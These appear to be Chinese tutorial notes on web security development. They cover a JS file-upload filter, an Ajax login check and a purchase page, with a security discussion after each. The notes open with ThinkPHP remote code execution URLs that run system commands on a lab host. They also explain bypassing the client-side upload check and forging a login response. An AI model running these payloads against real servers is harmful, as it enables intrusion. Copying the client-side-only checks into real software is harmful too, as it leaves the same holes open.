<p><img src="https://i-blog.csdnimg.cn/blog_migrate/555946a3b5364425533db22d953f79fd.png" alt="Untitled"></p>
<p>192.168.137.1:84&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;<strong>dir 显示当前目录</strong></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e69ba850529ccaea3ddba2688dccd886.png" alt="Untitled"></p>
<p>192.168.137.1:84&#x2F;？s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;<strong>whoami 显示当前电脑用户名</strong></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2688d3f2d8500156addc977311f8af55.png" alt="Untitled"></p>
<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="第一天-1"><a href="#第一天-1" class="headerlink" title="第一天"></a>第一天</h2><p>安全开发-JS应用&amp;原生开发&amp;JQuery库&amp;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Ajax%E6%8A%80%E6%9C%AF&spm=1001.2101.3001.7020">Ajax技术</a>&amp;前端后端&amp;安全验证处理</p>
<p>参考</p>
<blockquote>
<p>1、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8E%9F%E7%94%9FJS&spm=1001.2101.3001.7020">原生JS</a>教程<br><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/js/index.asp">https://www.w3school.com.cn/js/index.asp</a><br>2、jQuery库教程<br><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/jquery/index.asp">https://www.w3school.com.cn/jquery/index.asp</a></p>
</blockquote>
<h3 id="JS原生开发-文件上传-变量-对象-函数-事件"><a href="#JS原生开发-文件上传-变量-对象-函数-事件" class="headerlink" title="JS原生开发-文件上传-变量&amp;对象&amp;函数&amp;事件"></a>JS原生开发-文件上传-变量&amp;对象&amp;函数&amp;事件</h3><h4 id="JS函数介绍"><a href="#JS函数介绍" class="headerlink" title="JS函数介绍"></a>JS函数介绍</h4><p>这一行代码是一个HTML中的JavaScript事件处理器，用于在文件选择框内容发生变化（用户选择文件）时触发相应的检查函数。具体来说：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;f&quot; onchange=&quot;CheckFileExt(this.value)&quot;&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li><strong><code>onchange</code></strong>: 这是一个HTML事件属性，表示在元素内容变化时触发。</li>
<li><strong><code>CheckFileExt(this.value)</code></strong>: 这是一个JavaScript函数调用，当文件选择框内容变化时，会调用名为 <strong><code>CheckFileExt</code></strong> 的函数，并将选择的文件路径（**<code>this.value</code>** 表示当前元素的值，即文件路径）作为参数传递给该函数。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var index = filename.lastIndexOf(&quot;.&quot;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这段 JavaScript 代码用于获取文件名中最后一个点（.）后面的部分，即文件的扩展名。</span></span><br></pre></td></tr></table></figure>





<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var index = filename.lastIndexOf(&quot;.&quot;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">lastIndexOf(<span class="string">&quot;.&quot;</span>): 这是 JavaScript 字符串对象的方法，用于返回字符串中最后一个出现的点的索引位置。</span></span><br></pre></td></tr></table></figure>





<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var ext = filename.substr(index+1);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">substr(index+1): 这是 JavaScript 字符串对象的方法，用于从字符串的指定位置（在这里是 index+1，即点的后一个位置）开始提取子字符串。这里的 ext 变量将包含文件的扩展名。</span></span><br></pre></td></tr></table></figure>





<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location.reload(true);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这是一个 JavaScript 代码片段，用于重新加载当前页面</span></span><br></pre></td></tr></table></figure>





<blockquote>
<p>location.reload(true): 这是 JavaScript 的 location 对象的 reload 方法。reload 方法用于重新加载当前文档。传递 true 参数表示强制从服务器重新加载页面，而不使用缓存。如果省略参数或传递 false，则可能使用缓存进行重新加载。</p>
<p>这行代码的作用是强制刷新当前页面，确保获取最新的内容，而不使用浏览器缓存。</p>
</blockquote>
<p>使用js实现文件上传</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 表单用于文件上传，指定了上传的目标地址为 <span class="string">&quot;upload.php&quot;</span>，使用 <span class="variable constant_">POST</span> 方法提交，并设置 enctype 为 <span class="string">&quot;multipart/form-data&quot;</span> --&gt;</span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;!-- 为文件上传输入框添加标签 --&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;选择文件:&lt;/label&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!-- 这是一个包含文件上传输入框的 HTML 代码，并且在用户选择文件时触发 CheckFileExt 函数 --&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;f&quot; onchange=&quot;CheckFileExt(this.value)&quot;&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!-- 提交按钮 --&gt;</span><br><span class="line">    &lt;button type=&quot;submit&quot;&gt;上传文件&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>1、布置前端页面，创建js目录，帮在js目录下创建upload.html<br>2、JS获取提交数据<br>3、JS对上传格式判断<br>4、后端对上传数据处理，创建upload文件目录保存上传文件，创建upload.php处理数据。</p>
</blockquote>
<h4 id="前端JS进行后缀过滤，后端PHP进行上传处理"><a href="#前端JS进行后缀过滤，后端PHP进行上传处理" class="headerlink" title="前端JS进行后缀过滤，后端PHP进行上传处理"></a><strong>前端JS进行后缀过滤，后端PHP进行上传处理</strong></h4><p>架构：html js php - upload.php</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// JavaScript 函数 CheckFileExt 用于检查文件后缀名</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">CheckFileExt</span>(<span class="params">filename</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 允许的文件后缀名数组</span></span><br><span class="line">        <span class="keyword">var</span> exts = [<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">        <span class="comment">// 获取文件名中最后一个点后面的部分，即文件的后缀名</span></span><br><span class="line">        <span class="keyword">var</span> index = filename.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(index + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历允许的文件后缀名数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; exts.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// 检查是否匹配允许的后缀名</span></span><br><span class="line">            <span class="keyword">if</span> (ext === exts[i]) &#123;</span><br><span class="line">                <span class="comment">// 文件后缀名正确，设置 flag 为 true，显示提示信息，并跳出循环</span></span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&#x27;文件后缀名正确&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 flag 为 false，表示文件后缀名错误，显示错误提示，并强制刷新页面</span></span><br><span class="line">        <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;文件后缀错误！&#x27;</span>)</span><br><span class="line">            location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>上传非[‘png’, ‘gif’, ‘jpg’]后缀中的文件</p>
<p><img src="/img/xiaodi/56b4ade2ba433805e01edabf8efb49f7.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2d85d33ddf7d46e8aecb47902a1c17fe.png" alt="Untitled"></p>
<p>上传[‘png’, ‘gif’, ‘jpg’]后缀中的文件</p>
<p><img src="/img/xiaodi/7ebee27f5ef082f85768e1674890cae9.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4a86eea2f7525c9d00b5e782ded1248a.png" alt="Untitled"></p>
<h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><p>1、过滤代码能看到分析绕过</p>
<p><img src="/img/xiaodi/91be31b6e5708568da3f624064ef7643.png" alt="Untitled"></p>
<p>2、禁用JS或删除过滤代码绕过</p>
<blockquote>
<ul>
<li><p>将页面源代码复制下来，在本地创建，并删除检验代码的函数调用onchange&#x3D;”CheckFileExt(this.value)”</p>
</li>
<li><p>将调用的文件上传地址，切换为使用网址路由的样式<strong><a target="_blank" rel="noopener" href="http://192.168.137.1:84/js/upload.php">http://192.168.137.1:84/js/upload.php</a></strong></p>
</li>
<li><p>成功绕过文件检验，上传成功1.exe</p>
</li>
</ul>
</blockquote>
<h3 id="JS导入库开发-登录验证-JQuery库-Ajax技术"><a href="#JS导入库开发-登录验证-JQuery库-Ajax技术" class="headerlink" title="JS导入库开发-登录验证-JQuery库&amp;Ajax技术"></a>JS导入库开发-登录验证-JQuery库&amp;Ajax技术</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><p><code>$.ajax()</code>是一个用于执行异步HTTP请求的jQuery函数。它允许您通过JavaScript代码向服务器发送请求，并在不刷新整个页面的情况下接收和处理响应。</p>
<p>用法示例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">.ajax(&#123;</span></span><br><span class="line">  url: &quot;example.com/data&quot;,  // 请求的URL</span><br><span class="line">  method: &quot;GET&quot;,            // HTTP请求方法（GET、POST等）</span><br><span class="line">  data: &#123;                   // 发送到服务器的数据（可选）</span><br><span class="line">    param1: &quot;value1&quot;,</span><br><span class="line">    param2: &quot;value2&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  success: function(response) &#123;  // 请求成功时的回调函数</span><br><span class="line">    console.log(&quot;请求成功！&quot;);</span><br><span class="line">    console.log(response);       // 服务器响应的数据</span><br><span class="line">  &#125;,</span><br><span class="line">  error: function(xhr, status, error) &#123;  // 请求失败时的回调函数</span><br><span class="line">    console.log(&quot;请求失败！&quot;);</span><br><span class="line">    console.log(error);                    // 错误信息</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	在这个示例中，我们通过url参数指定了服务器的URL，通过method参数指定了HTTP请求方法（这里是GET请求）。data参数是可选的，用于发送到服务器的数据。success回调函数在请求成功并且服务器返回响应时被调用，error回调函数在请求失败时被调用。</p>
<p>​	您可以根据需要在$.ajax()函数中使用其他参数，例如dataType指定服务器响应的数据类型，headers指定请求头，以及其他高级选项。</p>
<p>​	通过使用$.ajax()函数，您可以在JavaScript中方便地执行异步HTTP请求，并根据服务器的响应进行相应处理。</p>
<p>**$(“button”).click(function () { … })**选择所有的 <button> 元素，并为它们绑定一个点击事件处理函数。当用户点击任何一个按钮时，绑定的函数将被执行。</p>
<p>我们使用console.log()在控制台输出一条消息，表示按钮已被点击。您还可以执行其他操作，例如修改页面的内容、发送AJAX请求或执行其他JavaScript逻辑。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="string">&quot;button&quot;</span>).click(<span class="function"><span class="title">function</span></span> () &#123;</span></span><br><span class="line">  // 在这里编写点击事件的处理代码</span><br><span class="line">  console.log(&quot;按钮被点击了！&quot;);</span><br><span class="line">  // 可以在这里执行其他操作，例如修改页面内容或发送AJAX请求等</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>$(‘.user’).val()和$(‘.pass’).val()用于获取具有user类和pass类的元素的值。</p>
<p>​	**$(‘.user’)**：这里使用了jQuery的选择器$(‘.user’)来选择所有具有user类的元素。这可以是一个输入框、文本框或其他表单元素。<br>​	**.val()**：这是一个jQuery函数，用于获取选定元素的值。在这个场景中，它被调用以获取具有user类的元素的值。<br>​	myuser：这是一个变量（或属性名），用于存储所选择元素的值。您可以根据需要更改变量名。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myuser: $(&#x27;.user&#x27;).val(),</span><br><span class="line">mypass: $(&#x27;.pass&#x27;).val()</span><br></pre></td></tr></table></figure>





<p>$success 是一个关联数组变量，通过使用 ‘msg’ 作为键，将 ‘ok’ 作为值存储在其中。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">success = array(<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="使用js实现登录验证"><a href="#使用js实现登录验证" class="headerlink" title="使用js实现登录验证"></a>使用js实现登录验证</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;login&quot;&gt;</span><br><span class="line">    &lt;!-- 登录标题 --&gt;</span><br><span class="line">    &lt;h2&gt;后台登录&lt;/h2&gt;</span><br><span class="line">    &lt;!-- 用户名标签和输入框 --&gt;</span><br><span class="line">    &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;user&quot;&gt;</span><br><span class="line">    &lt;!-- 密码标签和输入框 --&gt;</span><br><span class="line">    &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;pass&quot;&gt;</span><br><span class="line">    &lt;!-- 登录按钮 --&gt;</span><br><span class="line">    &lt;button&gt;登录&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 引入 jQuery 库 --&gt;</span><br><span class="line">&lt;script src=&quot;js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;**</span><br><span class="line"></span><br><span class="line">&lt;!-- JavaScript 代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 当按钮被点击时执行以下函数</span><br><span class="line">    $(&quot;button&quot;).click(function ()&#123;</span><br><span class="line">        // 使用 AJAX 发送 POST 请求到 &#x27;logincheck.php&#x27;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: &#x27;POST&#x27;,</span><br><span class="line">            url: &#x27;logincheck.php&#x27;,</span><br><span class="line">            // 发送的数据包括用户名和密码</span><br><span class="line">            data: &#123;</span><br><span class="line">                myuser: $(&#x27;.user&#x27;).val(),</span><br><span class="line">                mypass: $(&#x27;.pass&#x27;).val()</span><br><span class="line">            &#125;,</span><br><span class="line">            // 请求成功时执行的函数</span><br><span class="line">            success: function (res)&#123;</span><br><span class="line">                console.log(res);</span><br><span class="line">                // 如果返回的信息代码为1，表示登录成功，弹出提示并执行相应的处理</span><br><span class="line">                if(res[&#x27;infoCode&#x27;] == 1)&#123;</span><br><span class="line">                    alert(&#x27;登录成功&#x27;);</span><br><span class="line">                    // 登录成功处理事件（注释部分为示例，可根据需要进行处理）</span><br><span class="line">                    // location.href=&#x27;index.php&#x27;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    // 如果信息代码不为1，表示登录失败，弹出失败提示</span><br><span class="line">                    alert(&#x27;登录失败&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            // 指定返回的数据类型为 JSON</span><br><span class="line">            dataType: &#x27;json&#x27;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>操作步骤</p>
<blockquote>
<p>0、布置前端页面在js目录下创建login.html,并引入JQuery库在js目录下创建js目录引入。<br>1、获取登录事件<br>2、配置Ajax请求<br>3、后端代码验证<br>4、成功回调判断</p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/96e3ffb12680b67ea05a0433b156b5eb.png" alt="Untitled"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 从 POST 请求中获取用户提交的用户名和密码</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;myuser&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mypass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真实情况下，应该在数据库中进行验证获取用户信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设用户名是 &#x27;xiaodi&#x27;，密码是 &#x27;123456&#x27;</span></span><br><span class="line"><span class="comment">//$success 是一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span></span><br><span class="line"><span class="variable">$success</span> = <span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户名和密码是否匹配</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span> == <span class="string">&#x27;xiaodi&#x27;</span> &amp;&amp; <span class="variable">$pass</span> == <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果匹配，设置信息代码为1表示登录成功，并进行相应的处理</span></span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果不匹配，设置信息代码为0表示登录失败</span></span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果以 JSON 格式输出</span></span><br><span class="line"><span class="comment">//必须要回调输出，不然前端无法获取infocode的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/888c4d34000a95ee727be0f710a991cb.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/8ea0df882e6970b913ba1d860fa2d37a.png" alt="Untitled"><img src="https://i-blog.csdnimg.cn/blog_migrate/73f24c5e0fadd02ccd88a7f00888fe80.png" alt="Untitled"></p>
<p><strong>后端PHP进行帐号判断，前端JS进行登录处理</strong><br>架构：html js login.html - logincheck.php</p>
<h4 id="安全问题-1"><a href="#安全问题-1" class="headerlink" title="安全问题"></a>安全问题</h4><p>当成功后的操作如跳转到其他页面<strong>写在js中，不安全</strong></p>
<p>将抓到的包，设置其返回包也抓取，并将访问失败返回包的改为1发送，后登录成功</p>
<p><img src="/img/xiaodi/d29e7b3f9de3a3b0d58c8eee27d24528.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/a8f54d45a22f39d15f21d15d7943608b.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/40acbf9050ca7a0775edd498d3d79d19.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5698b98aa6fca1ea6c218c1c6e0d721e.png" alt="Untitled"></p>
<h4 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h4><p>当成功后的操作如跳转到其他页面写<strong>在PHP中，相对安全</strong></p>
<p>前端js只起到判断作用，无法执行跳转等逻辑</p>
<h3 id="JS导入库开发-逻辑购买-JQuery库-Ajax技术"><a href="#JS导入库开发-逻辑购买-JQuery库-Ajax技术" class="headerlink" title="JS导入库开发-逻辑购买-JQuery库&amp;Ajax技术"></a>JS导入库开发-逻辑购买-JQuery库&amp;Ajax技术</h3><h4 id="使用js实现商品购买"><a href="#使用js实现商品购买" class="headerlink" title="使用js实现商品购买"></a>使用js实现商品购买</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;!-- 设置文档的字符集为UTF-8 --&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;!-- 设置页面标题 --&gt;</span><br><span class="line">    &lt;title&gt;商品购买&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- 商品图片 --&gt;</span><br><span class="line">&lt;img src=&quot;iphone.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;!-- 当前拥有的金钱 --&gt;</span><br><span class="line">金钱：10000&lt;br&gt;</span><br><span class="line">&lt;!-- 商品价格 --&gt;</span><br><span class="line">商品价格：8888&lt;br&gt;</span><br><span class="line">&lt;!-- 输入购买数量的文本框 --&gt;</span><br><span class="line">数量：&lt;input type=&quot;text&quot; name=&quot;number&quot; class=&quot;number&quot;&gt;</span><br><span class="line">&lt;!-- 购买按钮 --&gt;</span><br><span class="line">&lt;button&gt;购买&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 引入 jQuery 库 --&gt;</span><br><span class="line">&lt;script src=&quot;js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- JavaScript 代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 当购买按钮被点击时执行以下函数</span><br><span class="line">    $(&quot;button&quot;).click(function ()&#123;</span><br><span class="line">        // 使用 AJAX 发送 POST 请求到 &#x27;shop.php&#x27;</span><br><span class="line">        **$.ajax(&#123;</span><br><span class="line">            type: &#x27;POST&#x27;,</span><br><span class="line">            url: &#x27;shop.php&#x27;,</span><br><span class="line">            // 发送的数据，包括购买数量</span><br><span class="line">            data: &#123;</span><br><span class="line">                num: $(&#x27;.number&#x27;).val(),</span><br><span class="line">            &#125;,</span><br><span class="line">            // 请求成功时执行的函数</span><br><span class="line">            success: function (res)&#123;</span><br><span class="line">                // 在控制台输出返回的数据</span><br><span class="line">                console.log(res);</span><br><span class="line">                // 如果返回的信息代码为1，表示购买成功</span><br><span class="line">                if(res[&#x27;infoCode&#x27;] == 1)&#123;</span><br><span class="line">                    // 弹出成功提示</span><br><span class="line">                    alert(&#x27;购买成功&#x27;);</span><br><span class="line">                    // 购买成功的流程（你可以在这里添加额外的处理）</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    // 如果信息代码不为1，表示购买失败</span><br><span class="line">                    // 弹出失败提示</span><br><span class="line">                    alert(&#x27;购买失败&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            // 指定返回的数据类型为 JSON</span><br><span class="line">            dataType: &#x27;json&#x27;,</span><br><span class="line">        &#125;);**</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实现步骤</p>
<blockquote>
<p>1、布置前端页面，在js目录下创建shop.html<br>2、获取登录事件<br>3、配置Ajax请求<br>4、后端代码验证 ,在js目录下创建shopcheck.php<br>5、成功回调判断</p>
